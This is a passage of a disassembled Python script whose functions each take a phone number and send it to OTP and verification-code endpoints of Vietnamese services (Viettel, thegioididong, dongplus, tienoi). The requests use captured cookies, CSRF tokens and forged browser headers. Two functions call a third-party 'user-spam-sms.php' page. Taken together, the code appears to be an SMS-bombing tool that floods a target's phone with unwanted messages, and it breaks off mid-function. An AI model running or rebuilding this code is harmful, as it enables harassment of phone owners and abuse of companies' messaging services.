683          10 LOAD_CONST               5 ('2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1')

684          12 LOAD_CONST               6 ('https://vietteltelecom.vn/dang-ky')

685          14 LOAD_CONST               7 ('GS1.1.1685096321.1.1.1685096380.1.0.0')

686          16 LOAD_CONST               8 ('GA1.2.1385846845.1685096321')

687          18 LOAD_CONST               9 ('1')

688          20 LOAD_CONST              10 ('eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D')

678          22 LOAD_CONST              11 (('laravel_session', '_gcl_au', '_gid', '_fbp', '__zi', 'redirectLogin', '_ga_VH8261689Q', '_ga', '_gat_UA-58224545-1', 'XSRF-TOKEN'))
             24 BUILD_CONST_KEY_MAP     10
             26 STORE_FAST               1 (cookies)

691          28 BUILD_MAP                0

692          30 LOAD_CONST              12 ('Accept')
             32 LOAD_CONST              13 ('application/json, text/plain, */*')

691          34 MAP_ADD                  1

693          36 LOAD_CONST              14 ('Accept-Language')
             38 LOAD_CONST              15 ('vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5')

691          40 MAP_ADD                  1

694          42 LOAD_CONST              16 ('Connection')
             44 LOAD_CONST              17 ('keep-alive')

691          46 MAP_ADD                  1

695          48 LOAD_CONST              18 ('Content-Type')
             50 LOAD_CONST              19 ('application/json;charset=UTF-8')

691          52 MAP_ADD                  1

697          54 LOAD_CONST              20 ('Origin')
             56 LOAD_CONST              21 ('https://vietteltelecom.vn')

691          58 MAP_ADD                  1

698          60 LOAD_CONST              22 ('Referer')
             62 LOAD_CONST              23 ('https://vietteltelecom.vn/dang-nhap')

691          64 MAP_ADD                  1

699          66 LOAD_CONST              24 ('Sec-Fetch-Dest')
             68 LOAD_CONST              25 ('empty')

691          70 MAP_ADD                  1

700          72 LOAD_CONST              26 ('Sec-Fetch-Mode')
             74 LOAD_CONST              27 ('cors')

691          76 MAP_ADD                  1

701          78 LOAD_CONST              28 ('Sec-Fetch-Site')
             80 LOAD_CONST              29 ('same-origin')

691          82 MAP_ADD                  1

702          84 LOAD_CONST              30 ('User-Agent')
             86 LOAD_CONST              31 ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36')

691          88 MAP_ADD                  1

703          90 LOAD_CONST              32 ('X-CSRF-TOKEN')
             92 LOAD_CONST              33 ('dS0MwhelCkb96HCH9kVlEd3CxX8yyiQim71Acpr6')

691          94 MAP_ADD                  1

704          96 LOAD_CONST              34 ('X-Requested-With')
             98 LOAD_CONST              35 ('XMLHttpRequest')

691         100 MAP_ADD                  1

705         102 LOAD_CONST              36 ('X-XSRF-TOKEN')
            104 LOAD_CONST              37 ('eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ==')

691         106 MAP_ADD                  1

706         108 LOAD_CONST              38 ('sec-ch-ua')
            110 LOAD_CONST              39 ('"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"')

691         112 MAP_ADD                  1

707         114 LOAD_CONST              40 ('sec-ch-ua-mobile')
            116 LOAD_CONST              41 ('?0')

691         118 MAP_ADD                  1

708         120 LOAD_CONST              42 ('sec-ch-ua-platform')
            122 LOAD_CONST              43 ('"Windows"')

691         124 MAP_ADD                  1
            126 STORE_FAST               2 (headers)

712         128 LOAD_FAST                0 (phone)

713         130 LOAD_CONST              44 ('')

711         132 LOAD_CONST              45 (('phone', 'type'))
            134 BUILD_CONST_KEY_MAP      2
            136 STORE_FAST               3 (json_data)

716         138 LOAD_GLOBAL              1 (NULL + requests)
            150 LOAD_ATTR                1 (post)
            160 LOAD_CONST              46 ('https://vietteltelecom.vn/api/get-otp-login')
            162 LOAD_FAST                1 (cookies)
            164 LOAD_FAST                2 (headers)
            166 LOAD_FAST                3 (json_data)
            168 KW_NAMES                47
            170 PRECALL                  4
            174 CALL                     4
            184 STORE_FAST               4 (response)
            186 LOAD_CONST               0 (None)
            188 RETURN_VALUE

Disassembly of <code object dkvt at 0x7f48c6d758a0, file "<x>", line 718>:
718           0 RESUME                   0

720           2 LOAD_CONST               1 ('7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2')

721           4 LOAD_CONST               2 ('2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1')

722           6 LOAD_CONST               3 ('https://viettel.vn/dang-ky')

723           8 LOAD_CONST               4 ('eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D')

719          10 LOAD_CONST               5 (('laravel_session', '__zi', 'redirectLogin', 'XSRF-TOKEN'))
             12 BUILD_CONST_KEY_MAP      4
             14 STORE_FAST               1 (cookies)

726          16 BUILD_MAP                0

727          18 LOAD_CONST               6 ('Accept')
             20 LOAD_CONST               7 ('application/json, text/plain, */*')

726          22 MAP_ADD                  1

728          24 LOAD_CONST               8 ('Accept-Language')
             26 LOAD_CONST               9 ('vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5')

726          28 MAP_ADD                  1

729          30 LOAD_CONST              10 ('Connection')
             32 LOAD_CONST              11 ('keep-alive')

726          34 MAP_ADD                  1

730          36 LOAD_CONST              12 ('Content-Type')
             38 LOAD_CONST              13 ('application/json;charset=UTF-8')

726          40 MAP_ADD                  1

732          42 LOAD_CONST              14 ('Origin')
             44 LOAD_CONST              15 ('https://viettel.vn')

726          46 MAP_ADD                  1

733          48 LOAD_CONST              16 ('Referer')
             50 LOAD_CONST               3 ('https://viettel.vn/dang-ky')

726          52 MAP_ADD                  1

734          54 LOAD_CONST              17 ('Sec-Fetch-Dest')
             56 LOAD_CONST              18 ('empty')

726          58 MAP_ADD                  1

735          60 LOAD_CONST              19 ('Sec-Fetch-Mode')
             62 LOAD_CONST              20 ('cors')

726          64 MAP_ADD                  1

736          66 LOAD_CONST              21 ('Sec-Fetch-Site')
             68 LOAD_CONST              22 ('same-origin')

726          70 MAP_ADD                  1

737          72 LOAD_CONST              23 ('User-Agent')
             74 LOAD_CONST              24 ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36')

726          76 MAP_ADD                  1

738          78 LOAD_CONST              25 ('X-CSRF-TOKEN')
             80 LOAD_CONST              26 ('HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK')

726          82 MAP_ADD                  1

739          84 LOAD_CONST              27 ('X-Requested-With')
             86 LOAD_CONST              28 ('XMLHttpRequest')

726          88 MAP_ADD                  1

740          90 LOAD_CONST              29 ('X-XSRF-TOKEN')
             92 LOAD_CONST              30 ('eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==')

726          94 MAP_ADD                  1

741          96 LOAD_CONST              31 ('sec-ch-ua')
             98 LOAD_CONST              32 ('"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"')

726         100 MAP_ADD                  1

742         102 LOAD_CONST              33 ('sec-ch-ua-mobile')
            104 LOAD_CONST              34 ('?0')

726         106 MAP_ADD                  1

743         108 LOAD_CONST              35 ('sec-ch-ua-platform')
            110 LOAD_CONST              36 ('"Windows"')

726         112 MAP_ADD                  1
            114 STORE_FAST               2 (headers)

747         116 LOAD_CONST              37 ('msisdn')
            118 LOAD_FAST                0 (phone)

746         120 BUILD_MAP                1
            122 STORE_FAST               3 (json_data)

750         124 LOAD_GLOBAL              1 (NULL + requests)
            136 LOAD_ATTR                1 (post)
            146 LOAD_CONST              38 ('https://viettel.vn/api/get-otp')
            148 LOAD_FAST                1 (cookies)
            150 LOAD_FAST                2 (headers)
            152 LOAD_FAST                3 (json_data)
            154 KW_NAMES                39
            156 PRECALL                  4
            160 CALL                     4
            170 STORE_FAST               4 (response)
            172 LOAD_CONST               0 (None)
            174 RETURN_VALUE

Disassembly of <code object tgdd at 0x7f48c6df1530, file "<x>", line 752>:
752           0 RESUME                   0

754           2 LOAD_CONST               1 ('%7B%22UID%22%3A%2202a2125eae4752c091831644559197e73c7d03c7%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D')

755           4 LOAD_CONST               2 ('CfDJ8OWsBjKS6DlGsrtmU_sYztKa6jv4_yE6DtGOKVnXzsN6QtnTcJHOshhJAjy60o2M8G7nlhVDVpVJq5TrlHeeRcwJjejgiIZpN-iBvlNqnf1tRwxng2G6uuWHF9XpCpNPf5yKVSW_11B4iUgzW4n4SgE')

756           6 LOAD_CONST               3 ('GA1.2.2106570071.1685151972')

757           8 LOAD_CONST               4 ('GS1.1.1685151972.1.0.1685151972.60.0.0')

758          10 LOAD_CONST               5 ('GA1.1.2004811826.1685151972')

759          12 LOAD_CONST               6 ('fb.1.1685151972814.1550382232')

760          14 LOAD_CONST               7 ('1')

761          16 LOAD_CONST               8 ('v~23af4964fee97034df50d8ac200f8c95b4ea3899~lcw~1685151972938~vpv~0~lcw~1685151972940')

762          18 LOAD_CONST               7 ('1')

763          20 LOAD_CONST               9 ('beline2686|ZHFg6|ZHFg5')

764          22 LOAD_CONST              10 ('-113%2C14.225.211.123%2C1')

765          24 LOAD_CONST               7 ('1')

766          26 LOAD_CONST               7 ('1')

767          28 LOAD_CONST              11 ('5MoF_IoMgcKATLRi4lIvjOVPQrd')

768          30 LOAD_CONST              12 ('vid|eadd7b088636140f774e')

753          32 LOAD_CONST              13 (('DMX_Personal', '.AspNetCore.Antiforgery.UMd7_MFqVbs', '_gid', '_ga_TLRZMSX5ME', '_ga', '_fbp', 'cebs', '_ce.s', '_ce.clock_event', 'SvID', '_ce.clock_data', 'cebsp_', '_tt_enable_cookie', '_ttp', 'lhc_per'))
             34 BUILD_CONST_KEY_MAP     15
             36 STORE_FAST               1 (cookies)

772          38 LOAD_CONST              14 ('www.thegioididong.com')

773          40 LOAD_CONST              15 ('*/*')

774          42 LOAD_CONST              16 ('vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5')

775          44 LOAD_CONST              17 ('application/x-www-form-urlencoded; charset=UTF-8')

777          46 LOAD_CONST              18 ('https://www.thegioididong.com')

778          48 LOAD_CONST              19 ('https://www.thegioididong.com/lich-su-mua-hang/dang-nhap')

779          50 LOAD_CONST              20 ('"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"')

780          52 LOAD_CONST              21 ('?0')

781          54 LOAD_CONST              22 ('"Windows"')

782          56 LOAD_CONST              23 ('empty')

783          58 LOAD_CONST              24 ('cors')

784          60 LOAD_CONST              25 ('same-origin')

785          62 LOAD_CONST              26 ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36')

786          64 LOAD_CONST              27 ('XMLHttpRequest')

771          66 LOAD_CONST              28 (('authority', 'accept', 'accept-language', 'content-type', 'origin', 'referer', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'sec-fetch-dest', 'sec-fetch-mode', 'sec-fetch-site', 'user-agent', 'x-requested-with'))
             68 BUILD_CONST_KEY_MAP     14
             70 STORE_FAST               2 (headers)

790          72 LOAD_FAST                0 (phone)

791          74 LOAD_CONST              29 ('false')

792          76 LOAD_CONST               7 ('1')

793          78 LOAD_CONST              30 ('CfDJ8OWsBjKS6DlGsrtmU_sYztIFV_sLQ8iWp7L2ZHjo3-UAquJc6mF7IflJ21rflzBVCTfkVYuNcBYuDIdaZroeLkecOCkjg8RcsK0QvNDv6_w7iP7JTCGaGgWZ4Ybwep7Zt6N6vP8-qJcVUHhSPvjvh_s')

789          80 LOAD_CONST              31 (('phoneNumber', 'isReSend', 'sendOTPType', '__RequestVerificationToken'))
             82 BUILD_CONST_KEY_MAP      4
             84 STORE_FAST               3 (data)

796          86 LOAD_GLOBAL              1 (NULL + requests)
             98 LOAD_ATTR                1 (post)

797         108 LOAD_CONST              32 ('https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode')

798         110 LOAD_FAST                1 (cookies)

799         112 LOAD_FAST                2 (headers)

800         114 LOAD_FAST                3 (data)

796         116 KW_NAMES                33
            118 PRECALL                  4
            122 CALL                     4
            132 STORE_FAST               4 (response)
            134 LOAD_CONST               0 (None)
            136 RETURN_VALUE

Disassembly of <code object apiv2 at 0x7f48c6d75b80, file "<x>", line 803>:
803           0 RESUME                   0

805           2 LOAD_CONST               1 ('GA1.1.355569834.1685331326')

806           4 LOAD_CONST               2 ('%7B%22userId%22%3A%222150082854199568%22%2C%22pageviewId%22%3A%228770872279147596%22%2C%22sessionId%22%3A%227025862886191853%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D')

807           6 LOAD_CONST               3 ('GS1.1.1685331326.1.1.1685331343.0.0.0')

804           8 LOAD_CONST               4 (('_ga', '_hp2_id.758475466', '_ga_LKETQQ110J'))
             10 BUILD_CONST_KEY_MAP      3
             12 STORE_FAST               1 (cookies)

810          14 BUILD_MAP                0

811          16 LOAD_CONST               5 ('authority')
             18 LOAD_CONST               6 ('onlytrislua.x10.mx')

810          20 MAP_ADD                  1

812          22 LOAD_CONST               7 ('accept')
             24 LOAD_CONST               8 ('text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7')

810          26 MAP_ADD                  1

813          28 LOAD_CONST               9 ('accept-language')
             30 LOAD_CONST              10 ('vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5')

810          32 MAP_ADD                  1

814          34 LOAD_CONST              11 ('cache-control')
             36 LOAD_CONST              12 ('max-age=0')

810          38 MAP_ADD                  1

815          40 LOAD_CONST              13 ('content-type')
             42 LOAD_CONST              14 ('application/x-www-form-urlencoded')

810          44 MAP_ADD                  1

817          46 LOAD_CONST              15 ('origin')
             48 LOAD_CONST              16 ('https://onlytrislua.x10.mx')

810          50 MAP_ADD                  1

818          52 LOAD_CONST              17 ('referer')
             54 LOAD_CONST              18 ('https://onlytrislua.x10.mx/s/user-spam-sms.php')

810          56 MAP_ADD                  1

819          58 LOAD_CONST              19 ('sec-ch-ua')
             60 LOAD_CONST              20 ('"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"')

810          62 MAP_ADD                  1

820          64 LOAD_CONST              21 ('sec-ch-ua-mobile')
             66 LOAD_CONST              22 ('?0')

810          68 MAP_ADD                  1

821          70 LOAD_CONST              23 ('sec-ch-ua-platform')
             72 LOAD_CONST              24 ('"Windows"')

810          74 MAP_ADD                  1

822          76 LOAD_CONST              25 ('sec-fetch-dest')
             78 LOAD_CONST              26 ('document')

810          80 MAP_ADD                  1

823          82 LOAD_CONST              27 ('sec-fetch-mode')
             84 LOAD_CONST              28 ('navigate')

810          86 MAP_ADD                  1

824          88 LOAD_CONST              29 ('sec-fetch-site')
             90 LOAD_CONST              30 ('same-origin')

810          92 MAP_ADD                  1

825          94 LOAD_CONST              31 ('sec-fetch-user')
             96 LOAD_CONST              32 ('?1')

810          98 MAP_ADD                  1

826         100 LOAD_CONST              33 ('upgrade-insecure-requests')
            102 LOAD_CONST              34 ('1')

810         104 MAP_ADD                  1

827         106 LOAD_CONST              35 ('user-agent')
            108 LOAD_CONST              36 ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36')

810         110 MAP_ADD                  1
            112 STORE_FAST               2 (headers)

831         114 LOAD_FAST                0 (phone)

832         116 LOAD_CONST              37 ('493')

833         118 LOAD_CONST              38 ('TRTS')

830         120 LOAD_CONST              39 (('phone', 'server_id', 'key'))
            122 BUILD_CONST_KEY_MAP      3
            124 STORE_FAST               3 (data)

836         126 LOAD_GLOBAL              1 (NULL + requests)
            138 LOAD_ATTR                1 (post)
            148 LOAD_CONST              18 ('https://onlytrislua.x10.mx/s/user-spam-sms.php')
            150 LOAD_FAST                1 (cookies)
            152 LOAD_FAST                2 (headers)
            154 LOAD_FAST                3 (data)
            156 KW_NAMES                40
            158 PRECALL                  4
            162 CALL                     4
            172 STORE_FAST               4 (response)
            174 LOAD_CONST               0 (None)
            176 RETURN_VALUE

Disassembly of <code object apiv3 at 0x7f48c6d75cf0, file "<x>", line 838>:
838           0 RESUME                   0

840           2 LOAD_CONST               1 ('GA1.1.355569834.1685331326')

841           4 LOAD_CONST               2 ('%7B%22ts%22%3A1685616159432%2C%22d%22%3A%22onlytrislua.x10.mx%22%2C%22h%22%3A%22%2F%22%7D')

842           6 LOAD_CONST               3 ('%7B%22userId%22%3A%222150082854199568%22%2C%22pageviewId%22%3A%225407290981034883%22%2C%22sessionId%22%3A%22627390060443876%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D')

843           8 LOAD_CONST               4 ('GS1.1.1685616159.3.1.1685616694.0.0.0')

844          10 LOAD_CONST               5 ('Server-IPv2')

839          12 LOAD_CONST               6 (('_ga', '_hp2_ses_props.758475466', '_hp2_id.758475466', '_ga_LKETQQ110J', 'serverChoice'))
             14 BUILD_CONST_KEY_MAP      5
             16 STORE_FAST               1 (cookies)

847          18 BUILD_MAP                0

848          20 LOAD_CONST               7 ('authority')
             22 LOAD_CONST               8 ('onlytrislua.x10.mx')

847          24 MAP_ADD                  1

849          26 LOAD_CONST               9 ('accept')
             28 LOAD_CONST              10 ('text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7')

847          30 MAP_ADD                  1

850          32 LOAD_CONST              11 ('accept-language')
             34 LOAD_CONST              12 ('vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5')

847          36 MAP_ADD                  1

851          38 LOAD_CONST              13 ('cache-control')
             40 LOAD_CONST              14 ('max-age=0')

847          42 MAP_ADD                  1

852          44 LOAD_CONST              15 ('content-type')
             46 LOAD_CONST              16 ('application/x-www-form-urlencoded')

847          48 MAP_ADD                  1

854          50 LOAD_CONST              17 ('origin')
             52 LOAD_CONST              18 ('https://onlytrislua.x10.mx')

847          54 MAP_ADD                  1

855          56 LOAD_CONST              19 ('referer')
             58 LOAD_CONST              20 ('https://onlytrislua.x10.mx/download/user-vip-spam-sms.php')

847          60 MAP_ADD                  1

856          62 LOAD_CONST              21 ('sec-ch-ua')
             64 LOAD_CONST              22 ('"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"')

847          66 MAP_ADD                  1

857          68 LOAD_CONST              23 ('sec-ch-ua-mobile')
             70 LOAD_CONST              24 ('?0')

847          72 MAP_ADD                  1

858          74 LOAD_CONST              25 ('sec-ch-ua-platform')
             76 LOAD_CONST              26 ('"Windows"')

847          78 MAP_ADD                  1

859          80 LOAD_CONST              27 ('sec-fetch-dest')
             82 LOAD_CONST              28 ('document')

847          84 MAP_ADD                  1

860          86 LOAD_CONST              29 ('sec-fetch-mode')
             88 LOAD_CONST              30 ('navigate')

847          90 MAP_ADD                  1

861          92 LOAD_CONST              31 ('sec-fetch-site')
             94 LOAD_CONST              32 ('same-origin')

847          96 MAP_ADD                  1

862          98 LOAD_CONST              33 ('sec-fetch-user')
            100 LOAD_CONST              34 ('?1')

847         102 MAP_ADD                  1

863         104 LOAD_CONST              35 ('upgrade-insecure-requests')
            106 LOAD_CONST              36 ('1')

847         108 MAP_ADD                  1

864         110 LOAD_CONST              37 ('user-agent')
            112 LOAD_CONST              38 ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36')

847         114 MAP_ADD                  1
            116 STORE_FAST               2 (headers)

868         118 LOAD_FAST                0 (phone)

869         120 LOAD_CONST               5 ('Server-IPv2')

870         122 LOAD_CONST              39 ('TRTS')

867         124 LOAD_CONST              40 (('phone', 'ten_server', 'key'))
            126 BUILD_CONST_KEY_MAP      3
            128 STORE_FAST               3 (data)

873         130 LOAD_GLOBAL              1 (NULL + requests)
            142 LOAD_ATTR                1 (post)
            152 LOAD_CONST              20 ('https://onlytrislua.x10.mx/download/user-vip-spam-sms.php')
            154 LOAD_FAST                1 (cookies)
            156 LOAD_FAST                2 (headers)
            158 LOAD_FAST                3 (data)
            160 KW_NAMES                41
            162 PRECALL                  4
            166 CALL                     4
            176 POP_TOP
            178 LOAD_CONST               0 (None)
            180 RETURN_VALUE

Disassembly of <code object callv10 at 0x7f48c6df62a0, file "<x>", line 874>:
874           0 RESUME                   0

876           2 LOAD_CONST               1 ('GA1.2.1019704199.1688123462')

877           4 LOAD_CONST               2 ('1')

878           6 LOAD_CONST               3 ('GS1.1.1688123461.1.1.1688123540.56.0.0')

879           8 LOAD_CONST               4 ('GA1.1.313940094.1688123462')

880          10 LOAD_CONST               5 ('GS1.2.1688123462.1.1.1688123540.0.0.0')

875          12 LOAD_CONST               6 (('_gid', '_gat_UA-214880719-1', '_ga_RRJDDZGPYG', '_ga', '_ga_7ZDGMGYGRG'))
             14 BUILD_CONST_KEY_MAP      5
             16 STORE_FAST               1 (cookies)

884          18 LOAD_CONST               7 ('api.dongplus.vn')

885          20 LOAD_CONST               8 ('*/*')

886          22 LOAD_CONST               9 ('vi')

887          24 LOAD_CONST              10 ('application/json')

889          26 LOAD_CONST              11 ('https://dongplus.vn')

890          28 LOAD_CONST              12 ('https://dongplus.vn/user/login')

891          30 LOAD_CONST              13 ('"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"')

892          32 LOAD_CONST              14 ('?0')

893          34 LOAD_CONST              15 ('"Windows"')

894          36 LOAD_CONST              16 ('empty')

895          38 LOAD_CONST              17 ('cors')

896          40 LOAD_CONST              18 ('same-site')

897          42 LOAD_CONST              19 ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36')

883          44 LOAD_CONST              20 (('authority', 'accept', 'accept-language', 'content-type', 'origin', 'referer', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'sec-fetch-dest', 'sec-fetch-mode', 'sec-fetch-site', 'user-agent'))
             46 BUILD_CONST_KEY_MAP     13
             48 STORE_FAST               2 (headers)

901          50 LOAD_CONST              21 ('phone')
             52 LOAD_FAST                0 (phone)

900          54 BUILD_MAP                1
             56 STORE_FAST               3 (json_data)

904          58 LOAD_GLOBAL              1 (NULL + requests)
             70 LOAD_ATTR                1 (post)

905          80 LOAD_CONST              22 ('https://api.dongplus.vn/api/user/send-one-time-password')

906          82 LOAD_FAST                1 (cookies)

907          84 LOAD_FAST                2 (headers)

908          86 LOAD_FAST                3 (json_data)

904          88 KW_NAMES                23
             90 PRECALL                  4
             94 CALL                     4
            104 STORE_FAST               4 (response)
            106 LOAD_CONST               0 (None)
            108 RETURN_VALUE

Disassembly of <code object callv11 at 0x7f48c6de61f0, file "<x>", line 915>:
915           0 RESUME                   0

917           2 LOAD_CONST               1 ('1.1.2046735143.1688124277')

918           4 LOAD_CONST               2 ('GA1.3.324859919.1688124278')

919           6 LOAD_CONST               3 ('1')

920           8 LOAD_CONST               4 ('wn86kpVMWDe_EJy2p8BRWhxLKey')

921          10 LOAD_CONST               5 ('GA1.1.76499769.1688124278')

922          12 LOAD_CONST               6 ('0')

923          14 LOAD_CONST               7 ('eyJzaG93IjpmYWxzZSwiaGVpZ2h0IjpudWxsLCJyaWdodCI6MH0%3D')

924          16 LOAD_CONST               8 ('GS1.1.1688124278.1.1.1688124300.0.0.0')

916          18 LOAD_CONST               9 (('_gcl_au', '_gid', '_tt_enable_cookie', '_ttp', '_ga', '_acbswcu_l', '_acbswcu_stateData', '_ga_MTBX8SYKKD'))
             20 BUILD_CONST_KEY_MAP      8
             22 STORE_FAST               1 (cookies)

928          24 LOAD_CONST              10 ('app.tienoi.com.vn')

929          26 LOAD_CONST              11 ('application/json, text/plain, */*')

930          28 LOAD_CONST              12 ('vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6,zh-CN;q=0.5,zh;q=0.4')

931          30 LOAD_CONST              13 ('application/json')

933          32 LOAD_CONST              14 ('https://app.tienoi.com.vn')

934          34 LOAD_CONST              15 ('https://app.tienoi.com.vn/auth/registration?need=2000000&days=14')

935          36 LOAD_CONST              16 ('"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"')

936          38 LOAD_CONST              17 ('?0')

937          40 LOAD_CONST              18 ('"Windows"')

938          42 LOAD_CONST              19 ('empty')

939          44 LOAD_CONST              20 ('cors')

940          46 LOAD_CONST              21 ('same-origin')

941          48 LOAD_CONST              22 ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36')

927          50 LOAD_CONST              23 (('authority', 'accept', 'accept-language', 'content-type', 'origin', 'referer', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'sec-fetch-dest', 'sec-fetch-mode', 'sec-fetch-site', 'user-agent'))
             52 BUILD_CONST_KEY_MAP     13
             54 STORE_FAST               2 (headers)

945          56 LOAD_FAST                0 (phone)

946          58 LOAD_CONST              24 ('A123456789a')

947          60 LOAD_CONST              24 ('A123456789a')

948          62 LOAD_CONST              25 (True)

944          64 LOAD_CONST              26 (('mobilePhone', 'password', 'passwordConfirmation', 'isVoiceSms'))
             66 BUILD_CONST_KEY_MAP      4
             68 STORE_FAST               3 (json_data)

951          70 LOAD_GLOBAL              1 (NULL + requests)
             82 LOAD_ATTR                1 (post)

952          92 LOAD_CONST              27 ('https://app.tienoi.com.vn/portal/api/v1/public/signUp/sendAcceptanceCode')

953          94 LOAD_FAST                1 (cookies)

954          96 LOAD_FAST                2 (headers)

955          98 LOAD_FAST                3 (json_data)

951         100 KW_NAMES                28
            102 PRECALL                  4
            106 CALL                     4
            116 STORE_FAST               4 (response)
            118 LOAD_CONST               0 (None)
            120 RETURN_VALUE

Disassembly of <code object callv12 at 0x7f48c6df63d0, file "<x>", line 967>:
 967           0 RESUME                   0

 969           2 LOAD_CONST               1 ('GA1.2.1019704199.1688123462')

 970           4 LOAD_CONST               2 ('1')

 971           6 LOAD_CONST               3 ('GS1.1.1688123461.1.1.1688123540.56.0.0')

 972           8 LOAD_CONST               4 ('GA1.1.313940094.1688123462')

 973          10 LOAD_CONST               5 ('GS1.2.1688123462.1.1.1688123540.0.0.0')

 968          12 LOAD_CONST               6 (('_gid', '_gat_UA-214880719-1', '_ga_RRJDDZGPYG', '_ga', '_ga_7ZDGMGYGRG'))
              14 BUILD_CONST_KEY_MAP      5
              16 STORE_FAST               1 (cookies)

 977          18 LOAD_CONST               7 ('api.dongplus.vn')

 978          20 LOAD_CONST               8 ('*/*')

 979          22 LOAD_CONST               9 ('vi')

 980          24 LOAD_CONST              10 ('application/json')

 982          26 LOAD_CONST              11 ('https://dongplus.vn')

 983          28 LOAD_CONST              12 ('https://dongplus.vn/user/login')

 984          30 LOAD_CONST              13 ('"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"')

 985          32 LOAD_CONST              14 ('?0')

 986          34 LOAD_CONST              15 ('"Windows"')

 987          36 LOAD_CONST              16 ('empty')
